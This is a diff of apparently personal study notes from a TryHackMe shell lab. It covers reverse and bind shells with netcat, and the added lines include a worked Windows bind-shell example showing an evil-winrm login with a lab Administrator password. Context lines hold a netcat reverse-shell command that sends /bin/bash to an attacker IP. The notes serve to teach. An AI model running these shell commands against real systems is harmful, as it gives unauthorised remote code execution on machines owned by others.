@@ -69,7 +69,6 @@ shell@linux-shell-practice:~$ nc 10.11.12.223 443 -e /bin/bash
 ```
 connect to [10.11.22.223] from (UNKNOWN) [10.10.199.58] 43286
 ```
-```
 * Commands run over the shell are executed as the target user.
 ```
 whoami
@@ -77,23 +76,42 @@ shell
 ```
 
 ### Bind shells
-* This is where the code executed on the target is used to start a listener attached to a shell directly on the target.
+* Where code executed on the target is used to start a listener attached to a shell directly on the target.
 * This would then be opened up to the Internet.
-* This means you can connect to the port that the code has opened and obtain remote code execution that way.
-* This has the advantage of not requiring any configuration on your own network, but may be prevented by firewalls protecting the target.
-* Bind shells are less common, but still very useful.
+* Can connect to the port that the code has opened and obtain remote code execution.
+* Does not require any configuration on the attacker's network.
+* May be prevented by firewalls protecting the target.
+* Bind shells are less common.
 
-#### Bind Shell Example:
-* On the right we have a simulated target:
-* We'll use a Windows target this time.
-* First, we start a listener on the target -- this time we're also telling it to execute cmd.exe.
-* nc -lvnp 8000 -e "cmd.exe"
-* Then, with the listener up and running, we connect from our own machine to the newly opened port.
-* On the left we have the attacker's computer:
-* nc 10.10.2.57 8000
-* As you can see, this once again gives us code execution on the remote machine.
-* Note that this is not specific to Windows.
-* The important thing to understand here is that we are listening on the target, then connecting to it with our own machine.
+#### Bind Shell Example
+* Start a listener on the Windows target and tell it to execute cmd.exe.
+  * *Listening* on the target.
+```
+muri@augury:~$ evil-winrm -i 10.10.2.57 -u Administrator -p 'TryH4ckM3!'
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> nc -lvnp 8080 -r "cmd.exe"
+nc.exe : Listening on [any] 8080 ...
+    + CategoryInfo          : NotSpecified: (listening on [any] 8080 ...:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+connect to [10.10.2.57] from (UNKNOWN) [10.12.12.223] 57336
+```
+* Connect to the newly opened port (listener) from the attacking machine.
+* This gives code execution on the remote machine.
+```
+muri@augury:~$ nc 10.10.2.57 8080
+Microsoft Windows [Version 10.0.17763.737]
+(c) 2018 Microsoft Corporation.  All rights reserved.
+
+C:\Users\Administrator\Documents>whoami
+whoami
+win-shells\administrator
+
+C:\Users\Administrator\Documents
+```
 
 ## Shell Interactivity
 ### Interactive 
